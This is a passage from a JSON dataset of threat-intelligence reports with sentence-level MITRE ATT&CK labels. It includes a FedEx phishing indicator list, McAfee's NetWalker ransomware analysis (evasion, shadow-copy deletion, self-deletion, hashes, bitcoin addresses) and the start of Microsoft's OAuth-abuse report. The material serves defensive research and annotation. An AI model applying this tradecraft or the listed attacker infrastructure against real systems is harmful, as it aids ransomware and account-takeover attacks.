            "URLs hxxps://biriata[.]com/ff0787bfecd727e800/7_783335_2683580/2357_2741426_4412557_61/505175864_163-116-145-33 hxxps://entfernza[.]com/sf/tpl36/0?item=KE9Q&logo=01f&session_id=f8e48861-bc10-40e7-bd05-e152979e4ee7&sub1=ECVD_470446&sub5=0c1fd02a-51fd-474b-8954-1b700f38e0b9 hxxps://giggingge[.]com/sf/tpl36/0?item=KE9Q&logo=01f&session_id=b3beae86-91be-4ef4-8d2e-6f0a07b6ce7d&sub1=ECVD_470446&sub5=ee2c5954-324d-43da-8830-00445bd703e8#!/hst hxxps://obtrusiho[.]com/sf/tpl36/?item=KE9Q&logo=01f&session_id=eb178549-389d-4fd5-aa8c-adc714552d94&sub1=ECVD_470446&sub5=6a64a541-0f1f-4cc0-b655-3048f97e148e#!/hst hxxps://crisplyoo[.]com/sf/tpl36/0?item=KE9Q&logo=01f&session_id=742f8239-2017-4771-a6dc-ee09dc744bad&sub1=ECVD_470446&sub5=e4fdd22d-4394-49cf-8742-403d38df3a8c#!/hst hxxps://vod-7.zoonosisdewlap[.]com/ hxxps://v2-check.caducitymatroclinic[.]com/ hxxps://v2-check.turriferouscouloir[.]com/ hxxps://v2-check.diphysitismphotophile[.]com/ Domains biriata[.]com entfernza[.]com giggingge[.]com obtrusiho[.]com crisplyoo[.]com vod-7.zoonosisdewlap[.]com v2-check.caducitymatroclinic[.]com v2-check.turriferouscouloir[.]com v2-check.diphysitismphotophile[.]com The post FedEx Phishing Campaign Abusing TrustedForm and PAAY appeared first on Netskope. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1204.002"
            ],
            [],
            [
                "T1204.002"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Take a NetWalk on the Wild Side",
        "cti_report": [
            "title: Take a \u201cNetWalk\u201d on the Wild Side url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/take-a-netwalk-on-the-wild-side/ Executive Summary The NetWalker ransomware, initially known as Mailto, was first detected in August 2019.",
            "Since then, new variants were discovered throughout 2019 and the beginning of 2020, with a strong uptick noticed in March of this year. ",
            "NetWalker has noticeably evolved to a more stable and robust ransomware-as-a-service (RaaS) model, and our research suggests that the malware operators are targeting and attracting a broader range of technically advanced and enterprising criminal affiliates. ",
            "McAfee Advanced Threat Research (ATR) discovered a large sum of bitcoins linked to NetWalker which suggest its extortion efforts are effective and that many victims have had no option other than to succumb to its criminal demands. ",
            "We approached our investigation of NetWalker with some possible ideas about the threat actor behind it, only to later disprove our own hypothesis.",
            "We believe the inclusion of our thinking, and the means with which we debunked our own theory, highlight the importance of thorough research and we welcome further discussion on this topic.",
            "We believe it starts valuable discussions and helps avoid duplicate research efforts by others.",
            "We also encourage our peers in the industry to share information with us in case you have more evidence. ",
            "McAfee protects its customers against the malware covered in this blog in all its products, including personal antivirus, endpoint and gateway.",
            "To learn more about how McAfee products can defend against these types of attacks, visit our blog on Building Adaptable Security Architecture Against NetWalker. ",
            "Check out McAfee Insights to stay on top of NetWalker\u2019s latest developments and intelligence on other cyber threats, all curated by the McAfee ATR team.",
            "Not only that, Insights will also help you prioritize threats, predict if your countermeasures will work and prescribe corrective actions. ",
            "Introduction Since 2019, NetWalker ransomware has reached a vast number of different targets, mostly based in western European countries and the US.",
            "Since the end of 2019, the NetWalker gang has indicated a preference for larger organisations rather than individuals.",
            "During the COVID-19 pandemic, the adversaries behind NetWalker clearly stated that hospitals will not be targeted; whether they keep to their word remains to be seen. ",
            "The ransomware appends a random extension to infected files and uses Salsa20 encryption.",
            "It uses some tricks to avoid detection, such as a new defence evasion technique, known as reflective DLL loading, to inject a DLL from memory. ",
            "The NetWalker collective, much like those behind Maze, REvil and other ransomware, threatens to publish victims\u2019 data if ransoms are not paid. ",
            "As mentioned earlier, NetWalker RaaS prioritizes quality over quantity and is looking for people who are Russian-speaking and have experience with large networks.",
            "People who already have a foothold in a potential victim\u2019s network and can exfiltrate data with ease are especially sought after.",
            "This is not surprising, considering that publishing a victims\u2019 data is part of NetWalker\u2019s model. ",
            "The following sections are dedicated to introducing the NetWalker malware and displaying the telemetry status before moving on to the technical malware analysis of the ransomware\u2019s behaviour.",
            "We will explain how the decryptor works and show some interactions between NetWalker\u2019s operators and their victims.",
            "After this, we discuss the changes in modus operandi since September 2019, especially regarding payment behaviour.",
            "Then we show our attempts, unfruitful as they were, at discovering a link between NetWalker and previous, seemingly unrelated ransomware variants.",
            "Finally, we deliver an overview of IOCs related to NetWalker and its MITRE ATT&CK techniques. ",
            "Telemetry Using McAfee\u2019s billion Insights sensors, we can show the global prevalence of the NetWalker ransomware. Figure 1.",
            "McAfee MVISION Insights shows global prevalence of the NetWalker ransomware Technical Analysis Ransom note (pre-March 2020) ",
            "Before March 2020, the NetWalker ransom note indicated how to contact the adversary directly using anonymous email account services with random names (such as kkeessnnkkaa@cock.li and hhaaxxhhaaxx@tuta.io): Figure 2.",
            "Example of ransom note prior to March 2020 Ransom Note (Post-March 2020) ",
            "On 12 March 2020, a researcher shared a screenshot of a new NetWalker ransom note in a tweet and we can see that the attackers have changed the contact method significantly.",
            "Email communication has been dropped completely with victims now required to make contact through the NetWalker Tor interface where, after submitting their user key, they will then be redirected to a chat with NetWalker technical support.",
            "This change in contact method coincides with underground forum postings where NetWalker revealed it was opening its RaaS up for new affiliates.",
            "The Tor page was not the only noticeable change we will highlight in this blog. ",
            "Figure 3.",
            "Example of ransom note after March 2020 NetWalker Analysis Figure 4. NetWalker behavior NetWalker Resource Analysis (Pre-March 2020) ",
            "The NetWalker malware uses a custom resource type (1337 or 31337) containing its entire configuration.",
            "This file is extracted to memory and decrypted using the RC4 algorithm with a hard-coded key in the resource. ",
            "Before 12 March 2020, NetWalker used the email contact process between its support operation and the victims to proceed with payment and send the decryption program.",
            "To do this, NetWalker used its configuration file in the resource to set its encryption mode, the name of the ransom note, etc., and email contacts. ",
            "Name wwllww.exe Size 96256 bytes File-Type EXE SHA 256 58e923ff158fb5aecd293b7a0e0d305296110b83c6e270786edcc4fea1c8404c Compile time 6 December 2019 Figure 5.",
            "NetWalker resource from wwllww.exe Once decrypted, the configuration file reveals several parameters, allowing us to understand how it works (how it constitutes the ransom note, the number of threads allocated for encryption, etc.): mpk Public key mode Encryption mode thr Allocated threads for encryption process spsz Encryption chunk namesz Name length idsz ID length crmask .mailto[email].{ID} mail Contact mail lfile Ransom Note name lend B64 encoded ransom note white Encryption whitelist kill Processes, tasks, service names to terminate unlocker Decryption exclusion list NetWalker Resource Analysis (Post-March 2020) ",
            "When Netwalker changed its contact mode and switched from email to the submission of the user key directly on the web portal of the group\u2019s blog, the configuration file in the resource also changed. ",
            "We found changes in the configuration file, such as the disappearance of the contact \u201cmail\u201d and \u201ccrmask\u201d fields (previously set as XXX@cock.li,XXX@tuta.io, etc., and .mailto[email].{ID}).",
            "This field was replaced by \u201conion1\u201d and \u201conion2\u201d, and these fields are set with the NetWalker blog URL/payment page (hxxp://rnfdsgm<snip>drqqd.onion/).",
            "We also noticed that the NetWalker developers complemented their \u201cunlocker\u201d field with some specific values (e.g. \u201cpsexec.exe, system, forti*.exe, fmon.exe*, etc\u201d). ",
            "Name cnt.ex Size 70656 bytes File-Type EXE SHA 256 26dfa8512e892dc8397c4ccbbe10efbcf85029bc2ad7b6b6fe17d26f946a01bb Compile time 2 May 2020 Figure 6.",
            "NetWalker resource from cnt.ex Usually, attackers use RC_DATA or a malicious BITMAP.",
            "The latter can, for example, be a regular Bitmap (open matrix image format used by Windows) that can be used by malware to execute code or as a payload dropper.",
            "The image\u2019s pixels are an actual binary representation of the payload.",
            "This process can be summarized as Exe -> Resources -> BMP with embedded data in pixels fetched and decrypted by, e.g. a DLL -> Payload), etc.",
            "However, in this case, they use this special custom type to increase obfuscation.",
            "The NetWalker developers chose custom types by using 1337 or 31337 structs, so the resource format does not change.",
            "However, as we said, several values have changed or been replaced: mpk Public Key mode Encryption mode spsz Encryption chunk thr Allocated threads for encryption process namesz Name length idsz ID length lfile Ransom Note name onion1 Blog URL 1 onion 2 Blog URL 2 white Encryption whitelist kill Processes, tasks, service names to terminate net Network resources encryption unlocker Decryption exclusion list lend B64 encoded ransom note NetWalker Executable Analysis (Post-March 2020) ",
            "The malware sample used for this blog post has the same information: Name c21ecd18f0bbb28112240013ad42dad5c01d20927791239ada5b 61e1c6f5f010 Size 70656 bytes File-Type EXE SHA 256 c21ecd18f0bbb28112240013ad42dad5c01d20927791239ada5b 61e1c6f5f010 Compile time 2 May 2020 ",
            "The unpacked malware is a binary file of 32 bits that can be found as an EXE file. ",
            "Figure 7.",
            "Information sample of the malware The malware\u2019s first action is to combine all the required functions it needs into one large function, combining the modules already loaded in Windows with additional DLLs as described below. ",
            "Instead of searching for the function in the usual way, the malware makes a CRC32 hash of the name of each function and compares with hardcoded values.",
            "Additionally, instead of using the function \u201cGetProcAddress\u201d, the malware uses the Process Environment Block (PEB) to make analysis harder. Figure 8.",
            "Get the module accessing the PEB and using a CRC32 ",
            "If the module cannot be discovered, it will load with \u201cLdrLoadDll\u201d, a native function of Windows, to try avoiding hooks in the usual functions, e.g. \u201cLoadLibraryW\u201d: Figure 9.",
            "Load library using LdrLoadDll Figure 10.",
            "Get functions from module, e.g. using a CRC32 hash If the malware fails to get a function, it will go to a \u201csleep\u201d call and terminate itself. ",
            "Later, the malware extracts the configuration file from a resource with a custom type and a custom name using the functions \u201cFindResourceA\u201d, \u201cLockResource\u201d, \u201cLoadResource\u201d and \u201cSizeOfResource\u201d.",
            "The file extracted in memory is decrypted using the RC4 algorithm with a hardcoded key in the resource. ",
            "The struct of the resource is: 4 bytes ->",
            "The size of the hardcoded key to decrypt the configuration file. ",
            "Variable size -> the hardcoded key to decrypt the configuration file. ",
            "Variable size -> the configuration file encrypted. ",
            "The malware reads the first 4 bytes and reserves memory with the size of the password and reserves memory of the resource minus 4 bytes and the size of the password.",
            "Finally, it decrypts the configuration file: Figure 11.",
            "Get configuration file and decrypt it If the malware fails to get the configuration file, it will terminate itself. ",
            "After getting the configuration file, the malware will parse it and save the fields in memory and write in the registry information to encrypt the files in the machine.",
            "The malware will try first to write in the registry-hive \u201cHKEY_LOCAL_MACHINE\u201d but if it cannot create it, it will use the registry-hive \u201cHKEY_CURRENT_USER\u201d: Figure 12.",
            "Write in the registry After the writing in the registry has been completed, it will get some privileges using a token as SE_DEBUG_PRIVILEGE and SE_IMPERSONATE_PRIVILEGE: Figure 13.",
            "Get some special privileges in the token Later, the malware creates three threads, one to get information about the machine, such as the operating system version, one to get processes and the last one to get services in the system. ",
            "After this step, it will get the system directory and use \u201cVSSadmin\u201d to delete the Volume Shadow copies of the system.",
            "Volume Shadow copies can contain copies of the encrypted files and would be an option to restore from if no backup exists. ",
            "Figure 14.",
            "Delete the shadow volumes Later, the malware will enumerate the logical units, prepare the new extension for the future encrypted files, based on the size that is defined in the ransomware config with a random extension, and encrypt all files in the fixed type units and remote units with the new extension. ",
            "Figure 15.",
            "Crypt the files After all these steps have been completed, it will create the ransom note on the desktop using the functions \u201cSHGetFolderPathlW\u201d and \u201cCreateFileW\u201d.",
            "Subsequently, it will write the ransom note from the memory into a new file with the function \u201cWriteFile\u201d.",
            "The malware will create the ransom note in the root folder (for example \u201cc:\\\u201d) of each logical unit.",
            "Next, it will launch \u201cnotepad.exe\u201d with an argument to the ransom note file to show the user what happened on the system: Figure 16.",
            "Creation of the ransom note in the desktop and root units Finally, after the encryption of the files and creation of the ransom note, the malware creates a bat file in the %temp% folder of the machine with a temporary name and writes the content to destroy itself using the program \u201ctaskkill\u201d.",
            "The batch script will delete the malware sample with its path using the command \u201cdel\u201d and finally delete the bat file with the command \u201cdel %0%\u201d.",
            "Of course, as the malware uses the \u201cdel\u201d command without destroying itself before the deletion, it can be recovered with some forensic tools with luck (the same can also be said for the bat file). ",
            "This way the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers: Figure 17.",
            "Get Temp path and make a temporary file as a bat and launch it Finally, the malware will finish with \u201cExitProcess\u201d. ",
            "Decryptor When a NetWalker victim goes through technical support (see an example of this below) and pays the ransom demanded by the group they will be able to download the decryptor to clean up their environment. ",
            "Figure 18.",
            "Conversation with NetWalker operators The download is done directly from the NetWalker Tor site, where the payment page switches to a download page certifying that the payment was made and received: Figure 19.",
            "Decryptor download The decryptor is delivered in a zip archive containing the decryptor executable and a note explaining how to run the program correctly: Figure 20.",
            "Decryptor delivery The program launches a graphical interface allowing the user to decipher their workstation automatically or manually: Figure 21.",
            "Decryptor execution At the end of the decryption process, the program indicates the number of decrypted files, deletes the ransom note if the user has checked that option, and terminates, leaving the user to resume their work peacefully: Figure 22.",
            "Decryptor has finished the decryption process The decryptor program appears unique and is linked to one victim specifically.",
            "In our example, it only decrypts the files belonging to the victim who made the payment from the user key specified in the ransom note. ",
            "Underground Advertising In March 2020, the moniker Bugatti began actively advertising the NetWalker Ransomware-as-a-Service on two popular underground fora.",
            "Bugatti seems to have joined the underground scene in February 2020 but claims to have been active with NetWalker ransomware since September 2019.",
            "We have seen NetWalker activity before March but there has been a noticeable uptick in larger victims since their advertisement.",
            "For a relatively new ransomware it has been well received and respected among other cybercriminals as compared to, for instance, Nemty ransomware.",
            "The strength of NetWalker\u2019s reputation is such that our current hypothesis is that the individual behind Bugatti is most likely a well-respected and experienced cybercriminal, even though it is a new moniker. ",
            "Figure 23.",
            "Bugatti advertising NetWalker on an underground forum Bugatti provides regular updates on the improvements in the ransomware, such as the popular Invoke-ReflectivePEInjection method, also commonly used by Sodinokibi.",
            "In addition to the improvements in the ransomware, open slots for new affiliates are advertised.",
            "Bugatti strongly emphasized that they are primarily looking for experienced affiliates that focus on compromising the complete networks of organizations as opposed to end users.",
            "NetWalker is clearly following in the footsteps of its illustrious targeted ransomware peers like Sodinokibi, Maze and Ryuk. ",
            "One forum message in particular caught our attention as it included screenshots of several partial bitcoin addresses and USD amounts.",
            "This was most likely done to showcase the financial success of the ransomware.",
            "We have seen a similar posting in the past with the influential Sodinokibi affiliate Lalartu, so we decided to follow the money once more. Figure 24.",
            "Bugatti is looking for advanced affiliates and shows samples of BTC payments With the help of CipherTrace software we were able to find the complete BTC addresses from the screenshot and investigate the ledger further: Screenshot 1 3JHTYZhRmMcq7WCKRzFN98vWvAZk792w9J Screenshot 2 39aovzbz5rGoQdKjDm6JiybkSu1uGdVJ2V Screenshot 3 39NRnZtgACDVhhmc7RwmvH9ZDUKTNwwaeB Screenshot 4 3L4AW5kHnUCZBBjg2j1LBFCUN1RsHPLxCs Following the Money In the transactions mentioned in the underground forum post, the ransom amount payed by the victims is presumably shown.",
            "Since the bitcoin blockchain is a publicly accessible ledger, we can follow the money and see where the ransomware actors are transferring it to.",
            "In the case of the four posted transactions above, the full amount payed by the victim was transferred to two addresses (these addresses begin with bc1q98 and 1DgLhG respectively).",
            "It is safe to say that these two bitcoin addresses are under control of the NetWalker actors.",
            "We then proceeded on to analyze all incoming transactions to these two addresses and we were able to make the following observations: The first incoming transaction occurs on 1 March 2020. ",
            "On 30 March 2020 the first incoming transaction appears where the amount is split between 4 different bitcoin addresses.",
            "A split like this is typically seen in Ransomware-as-a-Service, where the ransom payment is split between the RaaS operators and the affiliate who caused the infection.",
            "In this first transaction, the split is 80%, 10% and two 5% portions.",
            "This split matches the advertisement on the underground forum (80% \u2013 20%). ",
            "The two 5% portions of the ransom payments that are split, seem to be consistently transferred to the two bitcoin addresses we revealed earlier (bc1q98 and 1DgLhG). ",
            "While the beneficiaries of the 5% cuts remain the same, the beneficiary of the 10% cut seems to change over time.",
            "Based on the forum post we assume these addresses also belong to the NetWalker actors. ",
            "Payments to the bc1q98 and 1DgLhG addresses that are not being split continue up until the end of May.",
            "Possibly the initial NetWalker operators added a RaaS operation, while continuing to cause NetWalker infections themselves. ",
            "While analyzing the bitcoin addresses that received 80% or more of the transaction amount, we noticed that there are some addresses that receive payments multiple times.",
            "A possible explanation could be that the address is configured as payout addresses for a certain campaign or affiliate.",
            "We identified 30 unique bitcoin addresses that seem to be the beneficiary of this larger portion of the ransom transaction.",
            "Some of these only received one payment but there are several that received multiple payments. ",
            "In the two addresses uncovered by tracing the transactions a total of 641 bitcoin is held on 27 July 2020.",
            "Which at the current market value of bitcoin is worth well over 7 million USD. ",
            "Amounts Extorted Working under the hypothesis that all the incoming transactions are ransomware payments; we can make the following observations: We found 23 transactions where the ransom payments were not split up and the beneficiaries are the two bitcoin addresses found by following the transactions mentioned in the underground forum post.",
            "The total amount of bitcoin extorted this way between 1 March 2020 and 27 July 2020 is 677 BTC.",
            "Additionally, the amount received from remaining transactions following the Ransomware-as-a-Service scheme by these addresses between 1 March 2020 and 27 July 2020 is 188 BTC. ",
            "In the transactions that are split, the largest amount (usually 80% to 90% of the total transaction value) is presumably transferred to the affiliate that caused the infection.",
            "When we summed up these largest portions, we saw a total of 1723 BTC being transferred to affiliates. ",
            "The total amount of extorted bitcoin that has been uncovered by tracing transactions to these NetWalker related addresses is 2795 BTC between 1 March 2020 and 27 July 2020.",
            "By using historic bitcoin to USD exchange rates, we estimate a total of 25 million USD was extorted with these NetWalker related transactions. ",
            "Even though we do not have complete visibility into the BTC flow before NetWalker started ramping up, one thing is certain, this quarter alone it has been highly successful at extorting organisations for large amounts of money.",
            "All this at a time when many sectors are struggling because people are sheltering in place and governments are trying to keep businesses from going bankrupt.",
            "NetWalker is making millions off the backs of legitimate companies. ",
            "Figure 25.",
            "Overview of uncovered bitcoin transactions, highlighting the two identified actor addresses. ",
            "Observed Changes While talking about the impact of NetWalker with our partners, we learned that the change in modus operandi not only affected the way the actors communicate with their victims.",
            "When there was a change from email communication to a dedicated Tor hidden service, the actors also moved away from using legacy bitcoin addresses to SegWit addresses.",
            "The benefits of using the newer SegWit addresses include faster transaction time and lower transaction cost.",
            "The NetWalker advertisement on the underground forum mentions instant and fully automatic payments around the time of this observed change.",
            "This makes us believe the ransomware actors were professionalizing their operation just before expanding to the Ransomware-as-a-Service model. ",
            "Comparison with Previous Ransomware Given the sudden appearance of NetWalker ransomware and the associated threat actor, it suggests that some prior knowledge on ransomware development or underground presence had to be in place.",
            "Armed with this hypothesis, we searched for possible links to underground actors and other ransomware strains that might fit the bill.",
            "We came across one threat actor offering ransomware that caught our attention.",
            "It was the use of the name NetWalker, in combination with a strong ransomware connection, that sparked our interest. ",
            "Some years ago, a threat actor using the moniker Eriknetwalker was advertising ransomware on several underground forums.",
            "We found posts from 2016 and the latest public activity was around June 2019, several months before NetWalker ransomware made its appearance. ",
            "Figure 26.",
            "Eriknetwalker began advertising their ransomware in 2016 (Google-translated from Russian) ",
            "Based on our underground research, we linked the moniker Eriknetwalker to the development and/or distribution of Amnesia, Bomber and Scarab ransomware.",
            "Eriknetwalker stopped advertising ransomware around June 2019.",
            "Therefore, we decided to perform a comparative analysis between the different ransomware strains linked to Eriknetwalker and some of the earliest versions of NetWalker we could find. ",
            "The goal of this comparative analysis was to identify whether there was an overlap between source codes.",
            "Such overlap could suggest a stronger link between the current NetWalker version and the other ransomware versions from Eriknetwalker, possibly even explaining the name overlap. ",
            "To execute the analysis, we used several tools one of which was the binary visualization tool Veles, which dynamically translates binary information into an abstract visualization that allows us to identify and compare patterns. ",
            "The different types of ransomware we began analyzing were the variants of Amnesia, Scarab, and NetWalker. ",
            "Figure 27.",
            "Flat visualization of binary data of the different ransomware variants Figure 28.",
            "3D visualization of binary data of the different ransomware variants Visualizing data in such a manner is a way to use the human brain to quickly identify patterns and be able to draw comparisons between objects.",
            "In our case, we see that, based on the binary data visualized in Figures 27 and 28, the ransomware binaries do yield differences that we cannot ignore. ",
            "Figure 29.",
            "Comparison of source code results Figure 29 shows the results of a source code similarity analysis led on the different variants of ransomware named in the figure itself.",
            "Interesting enough, Scarab and Amnesia show a higher overlap with Buran and Zeppelin than the early NetWalker samples.",
            "The percentages shown are the amount of code that is similar between two variants. ",
            "As illustrated in the overview, the September 2019 NetWalker version has a different codebase from the ErikNetWalker-linked ransomware variants.",
            "This finding disproves our earlier hypothesis that NetWalker is linked to the older Amnesia variants based on code overlap. ",
            "Often, research teams do not publish their results when it disproves their own hypothesis.",
            "However, for the sake of transparency, we decided to include our research efforts. ",
            "YARA Rules We uploaded a YARA rule to detect almost all the samples observed in the wild to date. ",
            "Indicators of Compromise During our investigation we have observed numerous IoCs linked to NetWalker ransomware.",
            "To obtain them please visit our McAfee ATR GitHub site, or get the latest NetWalker IoCs and intelligence on many other threats with McAfee Insights. ",
            "MITRE ATT&CK Techniques ",
            "The below techniques were based on our research and complemented with research from industry peers. ",
            "Initial Access Exploit Public-Facing Application (T1190) : Exploit Tomcat, Exploit WebLogic Spear phishing Attachment (T1566.001):",
            "Phishing email Valid Accounts (T1078): RDP compromised Execution PowerShell (T1059.001):",
            "PowerShell Script Command and Scripting Interpreter:",
            "Windows Command Shell (003) Service Execution (T1569.002):",
            "PsExec Native API (T1106): Use Windows API functions to inject DLL Windows Management Instrumentation (T1047) Persistence Registry Run Key (T1547.001):",
            "Place a value on RunOnce key Modify Registry key (T1112): Create its own registry key in \\SOFTWARE\\<uniquename> Privilege Escalation Exploitation for Privilege Escalation (T1068): CVE-2020-0796, CVE-2019-1458, CVE-2017-0213, CVE-2015-1701 Process Injection (T1055.001): Reflective DLL Injection Defense Evasion Disabling Security Tools (T1562.001): ESET AV Remover, Trend Micro\u2019s Security Agent Uninstall Tool, Microsoft Security Client Uninstall Process Injection (T1055.001): Reflective DLL Injection Deobfuscate/Decode Files or Information (T1140) Obfuscated Files or Information (T1027): PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption Credential Access Credential Dumping (T1003): Mimikatz, Mimidogz, Mimikittenz, Windows Credentials Editor, Pwdump, LaZagne Brute Force (T1110.001): NLBrute Discovery Network Service Scanning (T1046): SoftPerfect Network Scanner Security Software Discovery (T1518.001) ",
            "System Information Discovery (T1082) Lateral Movement Third-Party Software (T1072): TeamViewer, Anydesk Service Execution (T 1569.002): PsExec Lateral Tool Transfer (T1570) Collection Data from information repositories (T1213) Data from local system (T1005) Data from network shared drive (T1039) Command and Control Ingress Tool Transfer (T1105) ",
            "Impact Data Encrypted (T1486): NetWalker Ransomware Inhibit System Recovery (T1490): Shadow Copies Deleted Service Stop (T1489) Conclusion Ransomware has evolved into a lucrative business for threat actors, from underground forums selling ransomware, to offering services such as support portals to guide victims through acquiring crypto currency for payment, to the negotiation of the ransom.",
            "McAfee\u2019s Advanced Threat Research team has analysed the NetWalker ransomware and have been following its evolution from the initial sighting of the Mailto ransomware to its redevelopment into the NetWalker ransomware.",
            "The recent shift to a business-centric model of Ransomware-as-a-Service is a clear sign that it is stepping up, so it seems that the NetWalker group is following in the footsteps of REvil and other successful RaaS groups.",
            "The ransomware developers have proven the ability to refocus and capitalize on current world events and develop lures to help ensure the effectiveness of the ransomware, which has allowed them to become selective of their affiliates by limiting access to the ransomware to only those with vetted access to large organizations.",
            "As development of the ransomware continues, we have witnessed recent shifts in activity that closely follow in the footsteps of other ransomware developments, including threatening victims with the release of confidential information if the ransom is not met. ",
            "McAfee ATR is actively monitoring ransomware threats and will continue to update McAfee MVISION Insights and its social networking channels with new and current information.",
            "MVISION Insights is the only proactive endpoint security solution that simultaneously prioritizes and predicts threats that matter to our customers while offering prescriptive guidance on what to do in their local environment.",
            "Want to stay ahead of the adversaries?",
            "Check out McAfee MVISION Insights for more information.",
            "If you want to experience some of the MVISION Insights capabilities, go the Preview of MVISION Insights where you can select the top threat information that is available. ",
            "Authored by: Thibault Seret, Valentine Mairet, Jeffrey Sman, Alfred Alvarado, Tim Hux, Alexandre Mundo, John Fokker, Marc Rivero Lopez and Thomas Roccia. ",
            "The post Take a \u201cNetWalk\u201d on the Wild Side appeared first on McAfee Blog. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [
                "T1027",
                "T1140"
            ],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1112"
            ],
            [
                "T1112"
            ],
            [
                "T1112"
            ],
            [
                "T1057",
                "T1082"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [
                "T1059.003",
                "T1070.004"
            ],
            [
                "T1070.004"
            ],
            [
                "T1070.004"
            ],
            [],
            [
                "T1105",
                "T1140"
            ],
            [],
            [
                "T1105"
            ],
            [
                "T1140"
            ],
            [],
            [
                "T1140",
                "T1070.004"
            ],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1106",
                "T1055"
            ],
            [
                "T1027",
                "T1547.001",
                "T1112"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Malicious OAuth applications used to compromise email servers and spread spam  Microsoft Security Blog",
        "cti_report": [
            "title: Malicious OAuth applications used to compromise email servers and spread spam - Microsoft Security Blog url: http://www.microsoft.com/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/ Microsoft researchers recently investigated an attack where malicious OAuth applications were deployed on compromised cloud tenants and then used to control Exchange servers and spread spam.",
            "The investigation revealed that the threat actor launched credential stuffing attacks against high-risk accounts that didn\u2019t have multi-factor authentication (MFA) enabled and leveraged the unsecured administrator accounts to gain initial access.",
            "The unauthorized access to the cloud tenant enabled the actor to create a malicious OAuth application that added a malicious inbound connector in the email server.",
            "The actor then used the malicious inbound connector to send spam emails that looked like they originated from the targets\u2019 domain.",
            "The spam emails were sent as part of a deceptive sweepstakes scheme meant to trick recipients into signing up for recurring paid subscriptions. ",
            "Microsoft has been monitoring the rising popularity of OAuth application abuse.",
            "One of the first observed malicious usage of OAuth applications in the wild is consent phishing.",
            "Consent phishing attacks aim to trick users into granting permissions to malicious OAuth apps to gain access to user\u2019s legitimate cloud services (mail servers, files storage, management APIs, etc.).",
            "In the past few years, Microsoft has observed that more and more threat actors, including nation-state actors, have been using OAuth applications for different malicious purposes \u2013 command-and-control (C2) communication, backdoors, phishing, redirections, and so on. ",
            "This recent attack involved a network of single-tenant applications installed in compromised organizations being used as the actor\u2019s identity platform to perform the attack.",
            "As soon as the network was revealed, all the related applications were taken down and notifications to customers were sent, including recommended remediation steps. ",
            "This blog presents the technical analysis of this attack vector and the succeeding spam campaign attempted by the threat actor.",
            "It also provides guidance for defenders on protecting organizations from this threat, and how Microsoft security technologies detect it. Figure 1.",
            "Overview of the attack chain.",
            "The time between application deployment and usage varied; there were cases where the actor took months before using the application.",
            "Initial access For the attack to succeed, the threat actor needed to compromise cloud tenant users with sufficient permissions that would allow the actor to create an application in the cloud environment and give it admin consent.",
            "The actor performed credential stuffing attacks against their targets, attempting to access users with the global admin role.",
            "The authentication attempts, which originated from a single IP address, were launched against the Azure Active Directory PowerShell application (app ID: 1b730954-1685-4b74-9bfd-dac224a7b894).",
            "The same application was later used to deploy the rest of the attack. ",
            "Based on the success ratio of the authentication attempts, it is inferred that the attacker used a dump of compromised credentials.",
            "The investigation also revealed that 86% of the compromised tenants had at least one admin with a real-time high risk score, which means they were flagged by Azure AD Identity Protection to be most likely compromised.",
            "It is also important to note that all the compromised admins didn\u2019t have MFA enabled, which could have stopped the attack.",
            "These observations amplify the importance of securing accounts and monitoring for high-risk users, especially those with high privileges. ",
            "Deploying malicious OAuth application Once the threat actor gained access to privileged users, their next step was to set up the malicious application.",
            "Based on analysis of the event user agent (Swagger-Codegen/1.4.0.0/csharp) and how quickly the deployment of the application was done, it is likely that the actor ran a PowerShell script to perform the following Azure Active Directory (AAD) management activities in all targeted tenants: Register a new single\u2013tenant application with the naming convention of [domain name]_([a-zA-Z]){3} (for example: Contoso_GhY)Add the legacy permission Exchange.ManageAsApp which can be used for app-only authentication of Exchange Online PowerShell moduleGrant admin consent to the above permissionGive global admin and Exchange admin roles to the previously registered applicationAdd application credentials (key/certificate/both) The threat actor added their own credentials to the OAuth application, which enabled them to access the application even if the initially compromised global administrator changed their password. ",
